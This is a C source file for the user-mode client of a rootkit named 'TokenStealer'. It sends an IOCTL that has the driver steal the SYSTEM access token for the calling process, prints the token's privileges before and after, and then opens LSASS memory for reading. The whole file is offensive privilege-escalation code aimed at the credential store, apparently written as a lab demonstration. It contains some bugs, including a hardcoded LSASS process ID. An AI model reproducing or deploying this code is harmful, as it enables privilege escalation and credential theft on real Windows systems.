#include <Windows.h>
#include <Psapi.h>
#include <stdio.h>
#include <sddl.h>

#define IOCTL_INVINCIBLE_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)

void sendStealTokenIoctlCode() {
	// Open a handle to the TokenStealer rootkit device
	// CreateFile is used both to create new files, open existing files, I/O devices, pipes or consoles. 
	// CreateFile is what allows us to open a handle 
	// Set the handle to the SymLinkName
	// This sends a create IRP code to our driver which our IRP_MJ_CREATE = CreateCloseHandler 
	HANDLE deviceHandle = CreateFile("\\\\.\\TokenStealerDeviceLink", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (deviceHandle == INVALID_HANDLE_VALUE)
		printf("Failed to open a handle to the Token Stealer. Error: %lu\n", GetLastError());

	printf("A handle to TokenStealer has been created");
	printf("Sending IOCTL code to steal SYSTEM process access token");


	// This send IRP_MJ_DEVICE_CONTROL which =  DeviceControlHandler()
	BOOL success = DeviceIoControl(deviceHandle, IOCTL_INVINCIBLE_PROCESS, NULL, 0, NULL, 0, NULL, NULL);

	if (success)
		printf("SYSTEM acess token is acquired, token modified!\n Try killing this process from task manager now\n");

	else
		printf("Elevation failed. Error: %lu\n", GetLastError());

	CloseHandle(deviceHandle);
}

int readLsassMemory() {
	DWORD LsassPid = 1328;

	printf("Attempting to open a handle ton the LSASS process (PID: %lu)....\n", LsassPid);

	// OPen a handle to the process with read access
	HANDLE lsassHandle = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, LsassPid);
	if (lsassHandle == NULL) {
		DWORD error = GetLastError();
		printf("OpenProcess failed. Error code: %lu\n", error);
		if (error == ERROR_ACCESS_DENIED)
			printf("Acess denied. Target process may be protected (PPL)\n");

		return 1;
	}

	printf("Successfully opened a handle to the LSASS process\n");

		// Retrieves the base address of the LSASS protable executable in memory
	HMODULE hMods[1024];
	DWORD cb;
	void* baseAddress = NULL;

	if (EnumProcessModules(lsassHandle, hMods, sizeof(hMods), &cb)) {
		// The first element in the array represents the main executable image
		baseAddress = (void*)hMods[0];
		printf("LSASS base address: 0x%p\N", baseAddress);
	}
	else {
		printf("EnumProcessModules failed. Error code: %lu\n", GetLastError());
		CloseHandle(lsassHandle);
		return 1;
	}

	// Read the first 2 bytes from the base address (MZ)
	char buffer[2] = { 0 };
	SIZE_T bytesRead = 0;
	SIZE_T bytesToRead = 2;

	if (ReadProcessMemory(lsassHandle, baseAddress, buffer, bytesToRead, &bytesRead)) {
		printf("Sucessfully read %zu bytes from target memory\n", bytesRead);

		// Check for the standard DOS "MZ" magic bytes
		if (buffer[0] == 'M' && buffer[1] == 'Z') {
			printf("Magic bytes match 'MZ' (Valid portable executable).\n");
		}
		else {
			printf("Magic bytes do not match 'MZ'\n");
		}
	}
	else {
		printf("ReadProcessMemory failed. Error code: %lu\n", GetLastError());
	}

	CloseHandle(lsassHandle);
	return 0;
}

void PrintTokenInfo() {
    HANDLE rootkitClientHandle = NULL;
    HANDLE tokenHandle = NULL;
    DWORD dwLength = 0;

    // Pointers for dynamic token structures
    PTOKEN_USER processTokenPtr = NULL;
    PTOKEN_PRIVILEGES privilegesPtr = NULL;
    LPSTR processSid = NULL;

    rootkitClientHandle = GetCurrentProcess();

    // Open token with QUERY permissions
    if (!OpenProcessToken(rootkitClientHandle, TOKEN_QUERY, &tokenHandle)) {
        printf("[-] OpenProcessToken failed. Error: %lu\n", GetLastError());
        return;
    }

    // Extract and print User SID
    GetTokenInformation(tokenHandle, TokenUser, NULL, 0, &dwLength);
    if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
        processTokenPtr = (PTOKEN_USER)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwLength);
        if (processTokenPtr && GetTokenInformation(tokenHandle, TokenUser, processTokenPtr, dwLength, &dwLength)) {
            if (ConvertSidToStringSidA(processTokenPtr->User.Sid, &processSid)) {
                printf("[+] Process Owner SID : %s\n", processSid);
            }
        }
    }

    // Extract and enumerate token privileges
    dwLength = 0;
    GetTokenInformation(tokenHandle, TokenPrivileges, NULL, 0, &dwLength);

    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        printf("[-] Failed to calculate privilege buffer size.\n");
        goto Cleanup;
    }

    privilegesPtr = (PTOKEN_PRIVILEGES)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwLength);
    if (!privilegesPtr) {
        printf("[-] Privilege memory allocation failed.\n");
        goto Cleanup;
    }

    if (!GetTokenInformation(tokenHandle, TokenPrivileges, privilegesPtr, dwLength, &dwLength)) {
        printf("[-] GetTokenInformation (Privileges) failed. Error: %lu\n", GetLastError());
        goto Cleanup;
    }

    printf("[+] Total Privileges Found: %lu\n\n", privilegesPtr->PrivilegeCount);
    printf("%-38s | %-20s\n", "Privilege Name", "Current State");
    printf("-------------------------------------------------------------------\n");

    for (DWORD i = 0; i < privilegesPtr->PrivilegeCount; i++) {
        char privName[256];
        DWORD privNameSize = sizeof(privName);

        if (LookupPrivilegeNameA(NULL, &privilegesPtr->Privileges[i].Luid, privName, &privNameSize)) {
            DWORD attributes = privilegesPtr->Privileges[i].Attributes;
            const char* privState = "Disabled";

            if (attributes & SE_PRIVILEGE_ENABLED) {
                privState = "Enabled";
            }
            else if (attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT) {
                privState = "Enabled By Default";
            }
            else if (attributes & SE_PRIVILEGE_REMOVED) {
                privState = "Removed";
            }

            printf("%-38s | %-20s\n", privName, privState);
        }
    }

Cleanup:
    if (processSid) LocalFree(processSid);
    if (processTokenPtr) HeapFree(GetProcessHeap(), 0, processTokenPtr);
    if (privilegesPtr) HeapFree(GetProcessHeap(), 0, privilegesPtr);
    if (tokenHandle) CloseHandle(tokenHandle);
}

int main(int argc, char** argv) {
    // Our access token before stealing the "SYSTEM" process access token
    printf("\n===================================================================================\n");
    printf("============================== Token before stealing ==============================\n");
    printf("===================================================================================\n\n");
    PrintTokenInfo();
    printf("\n===================================================================================\n");
    printf("============================== Token before stealing ==============================\n");
    printf("===================================================================================\n\n");

    // Send "IOCTL_INVINCIBLE_PROCESS" IOCTL code to our rootkit to steal the "SYSTEM" process access token
    printf("Send Token Stealing IOCTL code?");
    getchar();
    sendStealTokenIoctlCode();

    // Our access token after stealing the "SYSTEM" process access token
    printf("\n===================================================================================\n");
    printf("============================== Token after stealing ===============================\n");
    printf("===================================================================================\n\n");
    PrintTokenInfo();
    printf("\n===================================================================================\n");
    printf("============================== Token after stealing ===============================\n");
    printf("===================================================================================\n\n");

    // Try read LSASS memory after obtaining the "SYSTEM" access token
    printf("Read LSASS Memory?");
    getchar();
    readLsassMemory();

    // Halt execution
    printf("Press any button to close the program...");
    getchar();
    return 0;
}